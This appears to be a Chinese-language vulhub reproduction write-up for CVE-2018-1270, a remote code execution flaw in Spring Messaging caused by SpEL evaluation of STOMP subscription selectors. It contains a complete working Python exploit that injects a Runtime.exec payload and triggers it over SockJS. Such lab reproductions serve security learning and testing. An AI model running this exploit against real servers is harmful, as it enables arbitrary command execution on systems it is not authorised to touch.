<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-1270spring-messaging-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-1270</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Spring Messaging </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">spring messaging</span><span class="cs9C1B1871">为</span><span class="cs8926E06">spring</span><span class="cs9C1B1871">框架提供消息支持，其上层协议是</span><span class="cs8926E06">STOMP</span><span class="cs9C1B1871">，底层通信基于</span><span class="cs8926E06">SockJS</span><span class="cs9C1B1871">，</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">spring messaging</span><span class="cs9C1B1871">中，其允许客户端订阅消息，并使用</span><span class="cs8926E06">selector</span><span class="cs9C1B1871">过滤消息。</span><span class="cs8926E06">selector</span><span class="cs9C1B1871">用</span><span class="cs8926E06">SpEL</span><span class="cs9C1B1871">表达式编写，并使用</span><span class="cs9FB05234">StandardEvaluationContext</span><span class="cs9C1B1871">解析，造成命令执行漏洞。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Spring Java Framework &lt; 5.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">网上大部分文章都说</span><span class="cs8926E06">spring messaging</span><span class="cs9C1B1871">是基于</span><span class="cs8926E06">websocket</span><span class="cs9C1B1871">通信，其实不然。</span><span class="cs8926E06">spring messaging</span><span class="cs9C1B1871">是基于</span><span class="cs8926E06">sockjs</span><span class="cs9C1B1871">（可以理解为一个通信协议），而</span><span class="cs8926E06">sockjs</span><span class="cs9C1B1871">适配多种浏览器：现代浏览器中使用</span><span class="cs8926E06">websocket</span><span class="cs9C1B1871">通信，老式浏览器中使用</span><span class="cs8926E06">ajax</span><span class="cs9C1B1871">通信。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">连接后端服务器的流程，可以理解为：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">用</span><span class="cs8926E06"><a class="cs508254C" href="http://jmesnil.net/stomp-websocket/doc/"><span class="cs4B51D5E4">STOMP</span><span class="cs1C2E50E7">协议</span></a></span><span class="cs9C1B1871">将数据组合成一个文本流</span></li><li class="cs63189908"><span class="cs9C1B1871">用</span><span class="cs8926E06"><a class="cs508254C" href="https://github.com/sockjs/sockjs-client"><span class="cs4B51D5E4">sockjs</span><span class="cs1C2E50E7">协议</span></a></span><span class="cs9C1B1871">发送文本流，</span><span class="cs8926E06">sockjs</span><span class="cs9C1B1871">会选择一个合适的通道：</span><span class="cs8926E06">websocket</span><span class="cs9C1B1871">或</span><span class="cs8926E06">xhr(http)</span><span class="cs9C1B1871">，与后端通信</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">所以我们可以使用</span><span class="cs8926E06">http</span><span class="cs9C1B1871">来复现漏洞，称之为</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">降维打击</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我编写了一个简单的</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">脚本</span><span class="cs8926E06">exploit.py</span><span class="cs9C1B1871">（需要用</span><span class="cs8926E06">python3.6</span><span class="cs9C1B1871">执行），因为该漏洞是订阅的时候插入</span><span class="cs8926E06">SpEL</span><span class="cs9C1B1871">表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：</span></p><ol start="1" style="margin-top:0;margin-bottom:0;">
			<li class="cs63189908"><span class="cs9C1B1871">基础地址，在</span><span class="cs8926E06">vulhub</span><span class="cs9C1B1871">中为</span><span class="cs9FB05234">http://your-ip:8080/gs-guide-websocket</span></li><li class="cs63189908"><span class="cs9C1B1871">待执行的</span><span class="cs8926E06">SpEL</span><span class="cs9C1B1871">表达式，如</span><span class="cs9FB05234">T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/success&#39;)</span></li><li class="cs63189908"><span class="cs9C1B1871">某一个订阅的地址，如</span><span class="cs8926E06">vulhub</span><span class="cs9C1B1871">中为：</span><span class="cs9FB05234">/topic/greetings</span></li><li class="cs63189908"><span class="cs9C1B1871">如何触发这个订阅，即如何让后端向这个订阅发送消息。在</span><span class="cs8926E06">vulhub</span><span class="cs9C1B1871">中，我们向</span><span class="cs9FB05234">/app/hello</span><span class="cs9C1B1871">发送一个包含</span><span class="cs8926E06">name</span><span class="cs9C1B1871">的</span><span class="cs8926E06">json</span><span class="cs9C1B1871">，即可触发这个事件。当然在实战中就不同了，所以这个</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">并不具有通用性。</span></li></ol>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据你自己的需求修改</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">。如果是</span><span class="cs8926E06">vulhub</span><span class="cs9C1B1871">环境，你只需修改</span><span class="cs8926E06">1</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">url</span><span class="cs9C1B1871">即可。</span></p><p class="cs3A447A38"><span class="cs9FB05234">CVE-2018-1270.py</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import random</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import threading</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import logging</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import json</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">logging.basicConfig(stream=sys.stdout, level=logging.INFO)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def random_str(length):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;letters = string.ascii_lowercase + string.digits</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return &#39;&#39;.join(random.choice(letters) for c in range(length))</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class SockJS(threading.Thread):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __init__(self, url, *args, **kwargs):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super().__init__(*args, **kwargs)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.base = f&#39;{url}/{random.randint(0, 1000)}/{random_str(8)}&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.daemon = True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.session = requests.session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.session.headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Referer&#39;: url,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.t = int(time.time()*1000)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def run(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = f&#39;{self.base}/htmlfile?c=_jp.vulhub&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response = self.session.get(url, stream=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for line in response.iter_lines():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.5)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def send(self, command, headers, body=&#39;&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = [command.upper(), &#39;\n&#39;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data.append(&#39;\n&#39;.join([f&#39;{k}:{v}&#39; for k, v in headers.items()]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data.append(&#39;\n\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data.append(body)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data.append(&#39;\x00&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = json.dumps([&#39;&#39;.join(data)])</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response = self.session.post(f&#39;{self.base}/xhr_send?t={self.t}&#39;, data=data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if response.status_code != 204:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logging.info(f&quot;send &#39;{command}&#39; data error.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;logging.info(f&quot;send &#39;{command}&#39; data success.&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __del__(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.session.close()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">sockjs = SockJS(&#39;http://your-ip:8080/gs-guide-websocket&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sockjs.start()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">sockjs.send(&#39;connect&#39;, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;accept-version&#39;: &#39;1.1,1.0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;heart-beat&#39;: &#39;10000,10000&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sockjs.send(&#39;subscribe&#39;, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;selector&#39;: &quot;T(java.lang.Runtime).getRuntime().exec(&#39;touch /tmp/success&#39;)&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;id&#39;: &#39;sub-0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;destination&#39;: &#39;/topic/greetings&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">})</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">data = json.dumps({&#39;name&#39;: &#39;vulhub&#39;})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">sockjs.send(&#39;send&#39;, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;content-length&#39;: len(data),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;destination&#39;: &#39;/app/hello&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}, data)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">执行：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Messaging/%ef%bc%88CVE-2018-1270%ef%bc%89Spring%20Messaging%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="95" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进入容器</span><span class="cs9FB05234">docker-compose exec spring bash</span><span class="cs9C1B1871">，可见</span><span class="cs9FB05234">/tmp/success</span><span class="cs9C1B1871">已成功创建：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Messaging/%ef%bc%88CVE-2018-1270%ef%bc%89Spring%20Messaging%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p></body>
</html>
